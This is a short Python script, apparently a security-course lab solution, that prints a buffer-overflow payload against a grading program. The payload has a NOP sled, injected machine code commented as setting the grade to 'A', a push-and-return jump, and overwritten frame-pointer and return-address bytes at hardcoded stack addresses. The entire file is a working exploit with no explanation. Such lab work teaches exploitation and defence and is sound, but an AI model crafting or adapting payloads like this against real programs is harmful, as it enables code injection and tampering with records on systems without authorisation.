#!/usr/bin/python
import sys

name = "Jamie Floyd\x00"
buf1 = "\x90"*39
code = "\xc6\x05\x30\xa0\x04\x08\x41" # set grade to 'A'
code2 = "\x68\x9c\x85\x04\x08\xc3" # push addr and ret
buf2 = "\x00"*4
i = "\x44\x00\x00\x00"
buf3 = "\x90"*8
ebp = "\xd8\xf6\xff\xbf"
payload = "\x8F\xa0\x04\x08\x80\xa0\x04\x08\x01"
print name+buf1+code+code2+buf2+i+buf3+ebp+payload
